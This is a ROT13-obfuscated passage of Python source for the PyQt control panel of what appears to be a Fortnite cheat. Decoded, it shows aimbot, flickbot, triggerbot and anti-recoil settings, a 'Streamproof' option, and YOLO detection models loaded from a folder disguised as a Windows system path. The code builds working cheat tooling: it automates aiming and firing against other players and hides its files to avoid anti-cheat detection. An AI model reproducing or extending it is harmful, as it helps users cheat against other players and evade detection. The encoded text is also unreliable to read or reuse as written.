        fybgf_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg_fybg6)

        fybgf_ynlbhg.nqqFcnpvat(5)
        fybgf_ynlbhg.nqqJvqtrg(frcnengbe_yvar14)
        fybgf_ynlbhg.nqqJvqtrg(frys.Jrypbzr_ynory_7)

        syvpxobg_ynlbhg = DIObkYnlbhg()
        syvpxobg_ynlbhg.nqqJvqtrg(frys.Ranoyr_Syvpx_purpxobk)
        ohggba_pbagnvare_ynlbhg_syvpx_xrl = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg_syvpx_xrl.nqqJvqtrg(frys.ubgxrl_ynory4)
        ohggba_pbagnvare_ynlbhg_syvpx_xrl.frgNyvtazrag(Dg.NyvtaYrsg)
        ohggba_pbagnvare_ynlbhg_syvpx_xrl.nqqJvqtrg(frys.oga_ubgxrl4)
        syvpxobg_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg_syvpx_xrl)
        syvpxobg_ynlbhg.nqqFcnpvat(5)
        syvpxobg_ynlbhg.nqqJvqtrg(frcnengbe_yvar11)
        syvpxobg_ynlbhg.nqqFcnpvat(5)
        syvpxobg_ynlbhg.nqqJvqtrg(frys.syvpx_frg_vasb_ynory)

        ohggba_pbagnvare_ynlbhg_syvpx_fpbcr = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg_syvpx_fpbcr.nqqJvqtrg(frys.syvpx_fpbcr_fyvqre)
        ohggba_pbagnvare_ynlbhg_syvpx_fpbcr.nqqJvqtrg(frys.syvpx_fpbcr_ynory)
        syvpxobg_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg_syvpx_fpbcr)

        ohggba_pbagnvare_ynlbhg_syvpx_pbby = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg_syvpx_pbby.nqqJvqtrg(frys.syvpx_pbby_fyvqre)
        ohggba_pbagnvare_ynlbhg_syvpx_pbby.nqqJvqtrg(frys.syvpx_pbby_ynory)
        syvpxobg_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg_syvpx_pbby)
        ohggba_pbagnvare_ynlbhg_syvpx_qrynl = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg_syvpx_qrynl.nqqJvqtrg(frys.syvpx_qrynl_fyvqre)
        ohggba_pbagnvare_ynlbhg_syvpx_qrynl.nqqJvqtrg(frys.syvpx_qrynl_ynory)
        syvpxobg_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg_syvpx_qrynl)
        syvpxobg_ynlbhg.nqqFcnpvat(5)
        syvpxobg_ynlbhg.nqqJvqtrg(frcnengbe_yvar12)
        syvpxobg_ynlbhg.nqqJvqtrg(frys.Jrypbzr_ynory_2)

        ivfhny_ynlbhg = DIObkYnlbhg()

        ohggba_pbagnvare_ynlbhg055 = DUObkYnlbhg()
        # ohggba_pbagnvare_ynlbhg055.nqqJvqtrg(frys.uhr_fyvqre)
        # ohggba_pbagnvare_ynlbhg055.nqqJvqtrg(frys.eto_ynory)
        ivfhny_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg055)

        ohggba_pbagnvare_ynlbhg06 = DUObkYnlbhg()
        # ohggba_pbagnvare_ynlbhg06.nqqJvqtrg(frys.yvtugarff_fyvqre)
        # ohggba_pbagnvare_ynlbhg06.nqqJvqtrg(frys.yvtugarff_ynory)
        ivfhny_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg06)

        ohggba_pbagnvare_ynlbhg07 = DUObkYnlbhg()
        # ohggba_pbagnvare_ynlbhg07.nqqJvqtrg(frys.bcnpvgl_fyvqre)
        # ohggba_pbagnvare_ynlbhg07.nqqJvqtrg(frys.bcnpvgl_ynory)
        ivfhny_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg07)

        # ivfhny_ynlbhg.nqqFcnpvat(5)
        # ivfhny_ynlbhg.nqqJvqtrg(frcnengbe_yvar3)
        ivfhny_ynlbhg.nqqFcnpvat(5)
        #ivfhny_ynlbhg.nqqJvqtrg(frys.Fgernzcebbs_purpxobk)
        ivfhny_ynlbhg.nqqJvqtrg(frys.Hfr_Uhr_purpxobk)
        ivfhny_ynlbhg.nqqJvqtrg(frys.Fubj_Sbi_purpxobk)
        ivfhny_ynlbhg.nqqJvqtrg(frys.Fubj_Pebffunve_purpxobk)
        ivfhny_ynlbhg.nqqJvqtrg(frys.Fubj_Qrgrpgvbaf_purpxobk)
        ivfhny_ynlbhg.nqqJvqtrg(frys.Fubj_Nvzyvar_purpxobk)
        ivfhny_ynlbhg.nqqJvqtrg(frys.Fubj_SCF_purpxobk)
        ivfhny_ynlbhg.nqqJvqtrg(frys.Fubj_Qroht_purpxobk)
        ivfhny_ynlbhg.nqqJvqtrg(frys.Fubj_PZQ_purpxobk)

        ohggba_pbagnvare_ynlbhg12 = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg12.nqqJvqtrg(frys.obk_glcr_pbzobobk)
        ohggba_pbagnvare_ynlbhg12.nqqJvqtrg(frys.obk_glcr_ynory)
        ivfhny_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg12)

        ivfhny_ynlbhg.nqqFcnpvat(5)
        ivfhny_ynlbhg.nqqJvqtrg(frcnengbe_yvar4)

        # # Nqq n "Cerivrj" ohggba
        # frys.cerivrj_ohggba = DChfuOhggba("Cerivrj")
        # frys.cerivrj_ohggba.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        # ivfhny_ynlbhg.nqqJvqtrg(frys.cerivrj_ohggba)
        # ivfhny_ynlbhg.nqqJvqtrg(frcnengbe_yvar4)

        # Pbaarpg gur ohggba pyvpx gb n shapgvba gb bcra gur arj jvaqbj
        #frys.cerivrj_ohggba.pyvpxrq.pbaarpg(frys.fubj_cerivrj_jvaqbj)
        ivfhny_ynlbhg.nqqJvqtrg(frys.Jrypbzr_ynory_3)


        rkgen_ynlbhg = DIObkYnlbhg()
        rkgen_ynlbhg.nqqJvqtrg(frys.PhcZbqr_Ba_purpxobk)
        rkgen_ynlbhg.nqqJvqtrg(frys.Ranoyr_GevttreObg_purpxobk)
        rkgen_ynlbhg.nqqJvqtrg(frys.Erdhver_Xrlovaq_purpxobk)
        ohggba_pbagnvare_ynlbhg08 = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg08.nqqJvqtrg(frys.ubgxrl_ynory3)
        ohggba_pbagnvare_ynlbhg08.frgNyvtazrag(Dg.NyvtaYrsg)
        ohggba_pbagnvare_ynlbhg08.nqqJvqtrg(frys.oga_ubgxrl3)
        rkgen_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg08)
        ohggba_pbagnvare_ynlbhg09 = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg09.nqqJvqtrg(frys.fyvqre5)
        ohggba_pbagnvare_ynlbhg09.nqqJvqtrg(frys.Nhgb_Sver_Sbi_Fvmr_ynory)
        rkgen_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg09)
        ohggba_pbagnvare_ynlbhg10 = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg10.nqqJvqtrg(frys.fyvqre6)
        ohggba_pbagnvare_ynlbhg10.nqqJvqtrg(frys.Nhgb_Sver_Pbasvqrapr_ynory)
        rkgen_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg10)
        rkgen_ynlbhg.nqqFcnpvat(5)
        rkgen_ynlbhg.nqqJvqtrg(frcnengbe_yvar5)
        rkgen_ynlbhg.nqqFcnpvat(5)
        rkgen_ynlbhg.nqqJvqtrg(frys.Erqhpr_Oybbz_purpxobk)
        rkgen_ynlbhg.nqqJvqtrg(frys.NagvErpbvy_Ba_purpxobk)
        rkgen_ynlbhg.nqqJvqtrg(frys.Erdhver_NQF_purpxobk) 
        ohggba_pbagnvare_ynlbhg11 = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg11.nqqJvqtrg(frys.fyvqre60)
        ohggba_pbagnvare_ynlbhg11.nqqJvqtrg(frys.NagvErpbvy_Fgeratgu_ynory)
        rkgen_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg11)
        # rkgen_ynlbhg.nqqFcnpvat(3)
        # rkgen_ynlbhg.nqqJvqtrg(frys.grzcfcbbs_ohggba)
        rkgen_ynlbhg.nqqFcnpvat(5)
        rkgen_ynlbhg.nqqJvqtrg(frcnengbe_yvar6)
        rkgen_ynlbhg.nqqJvqtrg(frys.Jrypbzr_ynory_4)

        cebsvyr_ynlbhg = DIObkYnlbhg()
        cebsvyr_ynlbhg.nqqJvqtrg(frys.vasb_ynory_3)
        cebsvyr_ynlbhg.nqqJvqtrg(frys.vasb_ynory_4)
        cebsvyr_ynlbhg.nqqJvqtrg(frys.vasb_ynory_5)
        cebsvyr_ynlbhg.nqqJvqtrg(frys.vasb_ynory_6)
        cebsvyr_ynlbhg.nqqJvqtrg(frys.vasb_ynory_7)
        cebsvyr_ynlbhg.nqqFcnpvat(3)
        cebsvyr_ynlbhg.nqqJvqtrg(frcnengbe_yvar7)
        cebsvyr_ynlbhg.nqqFcnpvat(3)
        cebsvyr_ynlbhg.nqqJvqtrg(frys.vasb_ynory_8)
        #cebsvyr_ynlbhg.nqqJvqtrg(frys.vasb_ynory_9)
        cebsvyr_ynlbhg.nqqJvqtrg(frys.vasb_ynory_10)
        cebsvyr_ynlbhg.nqqJvqtrg(frys.vasb_ynory_11)
        cebsvyr_ynlbhg.nqqJvqtrg(frys.vasb_ynory_13)

        cebsvyr_ynlbhg.nqqFcnpvat(3)

        cebsvyr_ynlbhg.nqqJvqtrg(frys.oga_rkgenvav)

        cebsvyr_ynlbhg.nqqFcnpvat(5)
        cebsvyr_ynlbhg.nqqJvqtrg(frcnengbe_yvar9)
        cebsvyr_ynlbhg.nqqJvqtrg(frys.Jrypbzr_ynory_5)

        nqinaprq_ynlbhg = DIObkYnlbhg()
        nqinaprq_ynlbhg.nqqFcnpvat(3)
        nqinaprq_ynlbhg.nqqJvqtrg(frys.Hfr_Zbqry_Pynff_purpxobk)
        nqinaprq_ynlbhg.nqqFcnpvat(3)
        # Vzntr Fpnyvat
        ohggba_pbagnvare_ynlbhg_pynff = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg_pynff.nqqJvqtrg(frys.vzt_inyhr_pbzobobk)
        ohggba_pbagnvare_ynlbhg_pynff.nqqJvqtrg(frys.vzt_inyhr_ynory)
        nqinaprq_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg_pynff)
        nqinaprq_ynlbhg.nqqFcnpvat(3)
        # Zbqry Fryrpgbe
        ohggba_pbagnvare_ynlbhg_zbqry = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg_zbqry.nqqJvqtrg(frys.zbqry_fryrpgrq_pbzobobk)
        ohggba_pbagnvare_ynlbhg_zbqry.nqqJvqtrg(frys.zbqry_fryrpgrq_ynory)
        nqinaprq_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg_zbqry)
        nqinaprq_ynlbhg.nqqFcnpvat(3)
        # Znk Qrgrpgvbaf
        ohggba_pbagnvare_ynlbhg_znkqrg = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg_znkqrg.nqqJvqtrg(frys.fyvqre4)
        ohggba_pbagnvare_ynlbhg_znkqrg.nqqJvqtrg(frys.Znk_Qrgrpgvbaf_ynory)
        nqinaprq_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg_znkqrg)
        # Zbqry SCF
        ohggba_pbagnvare_ynlbhg_scf = DUObkYnlbhg()
        ohggba_pbagnvare_ynlbhg_scf.nqqJvqtrg(frys.fyvqre_scf)
        ohggba_pbagnvare_ynlbhg_scf.nqqJvqtrg(frys.scf_ynory)
        nqinaprq_ynlbhg.nqqYnlbhg(ohggba_pbagnvare_ynlbhg_scf)
        nqinaprq_ynlbhg.nqqFcnpvat(5)
        nqinaprq_ynlbhg.nqqJvqtrg(frcnengbe_yvar13)
        nqinaprq_ynlbhg.nqqJvqtrg(frys.Jrypbzr_ynory_6)




        nvzobg_ynlbhg.frgNyvtazrag(Dg.NyvtaGbc)
        fybgf_ynlbhg.frgNyvtazrag(Dg.NyvtaGbc)
        syvpxobg_ynlbhg.frgNyvtazrag(Dg.NyvtaGbc)
        ivfhny_ynlbhg.frgNyvtazrag(Dg.NyvtaGbc)
        rkgen_ynlbhg.frgNyvtazrag(Dg.NyvtaGbc)
        cebsvyr_ynlbhg.frgNyvtazrag(Dg.NyvtaGbc)
        nqinaprq_ynlbhg.frgNyvtazrag(Dg.NyvtaGbc)
        fgnpxrq_jvqtrg = DFgnpxrqJvqtrg()
        fgnpxrq_jvqtrg.nqqJvqtrg(DJvqtrg())
        fgnpxrq_jvqtrg.nqqJvqtrg(DJvqtrg())
        fgnpxrq_jvqtrg.nqqJvqtrg(DJvqtrg())
        fgnpxrq_jvqtrg.nqqJvqtrg(DJvqtrg())
        fgnpxrq_jvqtrg.nqqJvqtrg(DJvqtrg())
        fgnpxrq_jvqtrg.nqqJvqtrg(DJvqtrg())
        fgnpxrq_jvqtrg.nqqJvqtrg(DJvqtrg())
        fgnpxrq_jvqtrg.jvqtrg(0).frgYnlbhg(nvzobg_ynlbhg)
        fgnpxrq_jvqtrg.jvqtrg(1).frgYnlbhg(fybgf_ynlbhg)
        fgnpxrq_jvqtrg.jvqtrg(2).frgYnlbhg(syvpxobg_ynlbhg)
        fgnpxrq_jvqtrg.jvqtrg(3).frgYnlbhg(ivfhny_ynlbhg)
        fgnpxrq_jvqtrg.jvqtrg(4).frgYnlbhg(rkgen_ynlbhg)
        fgnpxrq_jvqtrg.jvqtrg(5).frgYnlbhg(cebsvyr_ynlbhg)
        fgnpxrq_jvqtrg.jvqtrg(6).frgYnlbhg(nqinaprq_ynlbhg)
        ynlbhg = DIObkYnlbhg()
        ynlbhg.nqqYnlbhg(onaare_ynlbhg)
        ynlbhg.nqqJvqtrg(ohggba_pbagnvare)
        ynlbhg.nqqJvqtrg(frcnengbe_yvar)
        ynlbhg.nqqJvqtrg(fgnpxrq_jvqtrg)
        frys.frgYnlbhg(ynlbhg)


        qrs frg_ohggba_fglyr(fryrpgrq_ohggba):
            oga_nvzobg.frgFglyrFurrg(frys.zrah_gno_fryrpgrq_fglyr() vs fryrpgrq_ohggba == "Nvzobg" ryfr zrah_gno_fglyr)
            oga_nvzobg.frgVpba(DVpba(s"P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\fxhyy-uvtuyvtugrq.cat") vs fryrpgrq_ohggba == "Nvzobg" ryfr DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\fxhyy.cat"))

            oga_fybgf.frgFglyrFurrg(frys.zrah_gno_fryrpgrq_fglyr() vs fryrpgrq_ohggba == "Fybgf" ryfr zrah_gno_fglyr)
            oga_fybgf.frgVpba(DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\tha-uvtuyvtugrq.cat") vs fryrpgrq_ohggba == "Fybgf" ryfr DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\tha.cat"))

            oga_syvpxobg.frgFglyrFurrg(frys.zrah_gno_fryrpgrq_fglyr() vs fryrpgrq_ohggba == "Syvpxobg" ryfr zrah_gno_fglyr)
            oga_syvpxobg.frgVpba(DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\ohyyrg-uvtuyvtugrq.cat") vs fryrpgrq_ohggba == "Syvpxobg" ryfr DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\ohyyrg.cat"))

            oga_ivfhny.frgFglyrFurrg(frys.zrah_gno_fryrpgrq_fglyr() vs fryrpgrq_ohggba == "Ivfhny" ryfr zrah_gno_fglyr)
            oga_ivfhny.frgVpba(DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\ivrj-uvtuyvtugrq.cat") vs fryrpgrq_ohggba == "Ivfhny" ryfr DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\ivrj.cat"))

            oga_rkgen.frgFglyrFurrg(frys.zrah_gno_fryrpgrq_fglyr() vs fryrpgrq_ohggba == "Rkgen" ryfr zrah_gno_fglyr)
            oga_rkgen.frgVpba(DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\nccyvpngvba-uvtuyvtugrq.cat") vs fryrpgrq_ohggba == "Rkgen" ryfr DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\nccyvpngvba.cat"))

            oga_cebsvyr.frgFglyrFurrg(frys.zrah_gno_fryrpgrq_fglyr() vs fryrpgrq_ohggba == "Cebsvyr" ryfr zrah_gno_fglyr)
            oga_cebsvyr.frgVpba(DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\cebsvyr-uvtuyvtugrq.cat") vs fryrpgrq_ohggba == "Cebsvyr" ryfr DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\cebsvyr.cat"))

            oga_nqinaprq.frgFglyrFurrg(frys.zrah_gno_fryrpgrq_fglyr() vs fryrpgrq_ohggba == "Zbqry" ryfr zrah_gno_fglyr)
            oga_nqinaprq.frgVpba(DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\oenva-uvtuyvtugrq.cat") vs fryrpgrq_ohggba == "Zbqry" ryfr DVpba("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\oenva.cat"))

        frg_ohggba_fglyr("Nvzobg")
        oga_nvzobg.pyvpxrq.pbaarpg(ynzoqn: frg_ohggba_fglyr("Nvzobg"))
        oga_fybgf.pyvpxrq.pbaarpg(ynzoqn: frg_ohggba_fglyr("Fybgf"))
        oga_syvpxobg.pyvpxrq.pbaarpg(ynzoqn: frg_ohggba_fglyr("Syvpxobg"))
        oga_ivfhny.pyvpxrq.pbaarpg(ynzoqn: frg_ohggba_fglyr("Ivfhny"))
        oga_rkgen.pyvpxrq.pbaarpg(ynzoqn: frg_ohggba_fglyr("Rkgen"))
        oga_cebsvyr.pyvpxrq.pbaarpg(ynzoqn: frg_ohggba_fglyr("Cebsvyr"))
        oga_nqinaprq.pyvpxrq.pbaarpg(ynzoqn: frg_ohggba_fglyr("Zbqry"))
        oga_nvzobg.pyvpxrq.pbaarpg(ynzoqn: fgnpxrq_jvqtrg.frgPheeragVaqrk(0))
        oga_fybgf.pyvpxrq.pbaarpg(ynzoqn: fgnpxrq_jvqtrg.frgPheeragVaqrk(1))
        oga_syvpxobg.pyvpxrq.pbaarpg(ynzoqn: fgnpxrq_jvqtrg.frgPheeragVaqrk(2))
        oga_ivfhny.pyvpxrq.pbaarpg(ynzoqn: fgnpxrq_jvqtrg.frgPheeragVaqrk(3))
        oga_rkgen.pyvpxrq.pbaarpg(ynzoqn: fgnpxrq_jvqtrg.frgPheeragVaqrk(4))
        oga_cebsvyr.pyvpxrq.pbaarpg(ynzoqn: fgnpxrq_jvqtrg.frgPheeragVaqrk(5))
        oga_nqinaprq.pyvpxrq.pbaarpg(ynzoqn: fgnpxrq_jvqtrg.frgPheeragVaqrk(6))

        frys.fyvqre.inyhrPunatrq.pbaarpg(frys.ba_fyvqre_inyhr_punatr)
        frys.fyvqre0.inyhrPunatrq.pbaarpg(frys.ba_fyvqre0_inyhr_punatr)
        frys.fyvqre3.inyhrPunatrq.pbaarpg(frys.ba_fyvqre3_inyhr_punatr)
        frys.fyvqre4.inyhrPunatrq.pbaarpg(frys.ba_fyvqre4_inyhr_punatr)
        frys.fyvqre5.inyhrPunatrq.pbaarpg(frys.ba_fyvqre5_inyhr_punatr)
        frys.fyvqre6.inyhrPunatrq.pbaarpg(frys.ba_fyvqre6_inyhr_punatr)
        frys.fyvqre60.inyhrPunatrq.pbaarpg(frys.ba_fyvqre60_inyhr_punatr)

        # Fybgf
        frys.fyvqre_fybg1.inyhrPunatrq.pbaarpg(frys.ba_fyvqre_fybg1_inyhr_punatr)
        frys.fyvqre_fybg2.inyhrPunatrq.pbaarpg(frys.ba_fyvqre_fybg2_inyhr_punatr)
        frys.fyvqre_fybg3.inyhrPunatrq.pbaarpg(frys.ba_fyvqre_fybg3_inyhr_punatr)
        frys.fyvqre_fybg4.inyhrPunatrq.pbaarpg(frys.ba_fyvqre_fybg4_inyhr_punatr)
        frys.fyvqre_fybg5.inyhrPunatrq.pbaarpg(frys.ba_fyvqre_fybg5_inyhr_punatr)

        frys.Ranoyr_Nvz_Fybg1_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Ranoyr_Nvz_Fybg2_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Ranoyr_Nvz_Fybg3_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Ranoyr_Nvz_Fybg4_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Ranoyr_Nvz_Fybg5_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)

        frys.syvpx_fpbcr_fyvqre.inyhrPunatrq.pbaarpg(frys.ba_syvpx_fpbcr_fyvqre_inyhr_punatr)
        frys.syvpx_pbby_fyvqre.inyhrPunatrq.pbaarpg(frys.ba_syvpx_pbby_fyvqre_inyhr_punatr)
        frys.syvpx_qrynl_fyvqre.inyhrPunatrq.pbaarpg(frys.ba_syvpx_qrynl_fyvqre_inyhr_punatr)
        frys.nvz_obar_pbzobobk.pheeragVaqrkPunatrq.pbaarpg(frys.hcqngr_nvz_obar)
        frys.fzbbguvat_glcr_pbzobobk.pheeragVaqrkPunatrq.pbaarpg(frys.hcqngr_fzbbguvat_glcr)
        frys.obk_glcr_pbzobobk.pheeragVaqrkPunatrq.pbaarpg(frys.hcqngr_obk_glcr)
        frys.Ranoyr_Nvz_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Ranoyr_Fybgf_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Fubj_Sbi_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Fubj_Pebffunve_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Fubj_Qrgrpgvbaf_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Fubj_Nvzyvar_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Erdhver_Xrlovaq_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Fubj_Qroht_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Fubj_SCF_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Fubj_PZQ_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Ranoyr_GevttreObg_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Pbagebyyre_Ba_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.PhcZbqr_Ba_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        #frys.Fgernzcebbs_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Erqhpr_Oybbz_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Erdhver_NQF_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.NagvErpbvy_Ba_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Ranoyr_Syvpx_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        #frys.uhr_fyvqre.inyhrPunatrq.pbaarpg(frys.hcqngr_eto_ynory)
        #frys.yvtugarff_fyvqre.inyhrPunatrq.pbaarpg(frys.hcqngr_eto_ynory)
        #frys.bcnpvgl_fyvqre.inyhrPunatrq.pbaarpg(frys.hcqngr_eto_ynory)
        frys.Hfr_Uhr_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.Hfr_Zbqry_Pynff_purpxobk.fgngrPunatrq.pbaarpg(frys.ba_purpxobk_fgngr_punatr)
        frys.vzt_inyhr_pbzobobk.pheeragVaqrkPunatrq.pbaarpg(frys.hcqngr_vzt_inyhr)

        frys.zbqry_fryrpgrq_pbzobobk.pheeragVaqrkPunatrq.pbaarpg(frys.ba_zbqry_fryrpgrq)

        frys.fyvqre_scf.inyhrPunatrq.pbaarpg(frys.ba_fyvqre_scf_inyhr_punatr)

        gel:
            frys.sbag_fvmr = bcra("P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\fvmr.gkg", "e").ernq()
        rkprcg:
            frys.sbag_fvmr = 15

        frys.hcqngr_fglyrfurrg()

    qrs ybnq_zbqryff(frys):
        gel:
            zbqry_svyrf = [s sbe s va bf.yvfgqve('zbqry') vs s.raqfjvgu(('.ratvar', '.cg', '.baak'))]
        rkprcg:
            zbqry_svyrf = [s sbe s va bf.yvfgqve(bcra(es"{pheerag_qverpgbel}\zbqry","e").ernq()) vs s.raqfjvgu(('.ratvar', '.cg', '.baak'))]

        # Ybnq qrsnhyg zbqryf sebz fcrpvsvrq qverpgbel
        qrsnhyg_zbqry_qve = 'P:\\CebtenzQngn\\FbsgjbexPE\\agqyy\\Ynatf\\RA-HF\\QngrgvzrPbasvthengvbaf\\Pe\\'
        qrsnhyg_zbqry_svyrf = [s sbe s va bf.yvfgqve(qrsnhyg_zbqry_qve) vs s.raqfjvgu(('.ratvar', '.cg'))]

        # Znc hfre-sevraqyl ynoryf gb npghny svyr anzrf
        qrsnhyg_zbqryf = {}
        sbe svyr va qrsnhyg_zbqry_svyrf:
            vs 'SbegavgrCeb' va svyr:
                ynory = "SbegavgrCeb" + bf.cngu.fcyvgrkg(svyr)[1]
                qrsnhyg_zbqryf[ynory] = svyr 
            ryvs 'Sbegavgr' va svyr:
                ynory = "Sbegavgr" + bf.cngu.fcyvgrkg(svyr)[1]
                qrsnhyg_zbqryf[ynory] = svyr 
            # ryvs 'SbegavgrCeb' va svyr:
            # 	ynory = "SbegavgrCeb" + bf.cngu.fcyvgrkg(svyr)[1]
            # 	qrsnhyg_zbqryf[ynory] = svyr 
            # ryvs 'JVAQBJFRA' va svyr:
            # 	ynory = "AvgrMreb" + bf.cngu.fcyvgrkg(svyr)[1]
            # 	qrsnhyg_zbqryf[ynory] = svyr 
            # ryvs 'JVAQBJFHA' va svyr:
            # 	ynory = "HavirefnyMreb" + bf.cngu.fcyvgrkg(svyr)[1]
            # 	qrsnhyg_zbqryf[ynory] = svyr 

        frys.zbqryff = {}

        vainyvq_zbqryf = []
        sbe zbqry_svyr va zbqry_svyrf:
            gel:
                zbqry_cngu = bf.cngu.wbva('zbqry', zbqry_svyr)
            rkprcg:
                zbqry_cngu = bf.cngu.wbva(bcra(es"{pheerag_qverpgbel}\zbqry","e").ernq(), zbqry_svyr)
            gel:
                zbqry_vafgnapr = LBYB(zbqry_cngu, gnfx='qrgrpg')
                frys.zbqryff[zbqry_svyr] = zbqry_vafgnapr
                frys.zbqry_fryrpgrq_pbzobobk.nqqVgrz(zbqry_svyr)
            rkprcg Rkprcgvba nf r:
                vainyvq_zbqryf.nccraq(zbqry_svyr)

        # Cebprff qrsnhyg zbqryf
        sbe ynory, svyr_anzr va qrsnhyg_zbqryf.vgrzf():
            zbqry_cngu = bf.cngu.wbva(qrsnhyg_zbqry_qve, svyr_anzr)
            gel:
                zbqry_vafgnapr = LBYB(zbqry_cngu, gnfx='qrgrpg')
                frys.zbqryff[ynory] = zbqry_cngu  # Fgber gur cngu sbe yngre hfr
                frys.zbqry_fryrpgrq_pbzobobk.nqqVgrz(ynory)
            rkprcg Rkprcgvba nf r:
                vainyvq_zbqryf.nccraq(ynory)

        # Frg qrsnhyg zbqry vs ab zbqryf ner ybnqrq
        vs abg zbqry_svyrf naq abg qrsnhyg_zbqryf:
            zrffntr = "Ab zbqry svyrf sbhaq va gur qverpgbel, hfvat qrsnhyg zbqry."
            pncgvba = "Reebe 0401: Zbqry Svaqvat Reebe"
            zrffntr_glcr = 0k10
            pglcrf.jvaqyy.hfre32.ZrffntrObkJ(0, zrffntr, pncgvba, zrffntr_glcr)
            vs qrsnhyg_zbqryf:
                qrsnhyg_zbqry = arkg(vgre(qrsnhyg_zbqryf.inyhrf()), Abar)
                vs qrsnhyg_zbqry:
                    ZlJvaqbj.zbqryy = LBYB(bf.cngu.wbva(qrsnhyg_zbqry_qve, qrsnhyg_zbqry))
            erghea

        # Fryrpg gur ynfg ybnqrq zbqry be snyyonpx gb gur svefg ninvynoyr zbqry
        vs Ynfg_Zbqry naq Ynfg_Zbqry va frys.zbqryff:
            gel:
                zbqry_cngu = frys.zbqryff[Ynfg_Zbqry]
                ZlJvaqbj.zbqryy = LBYB(zbqry_cngu, gnfx='qrgrpg')
                frys.zbqry_fryrpgrq_pbzobobk.frgPheeragGrkg(Ynfg_Zbqry)
            rkprcg Rkprcgvba nf r:
                snyyonpx_zbqry = arkg(vgre(frys.zbqryff.inyhrf()), Abar)
                vs snyyonpx_zbqry:
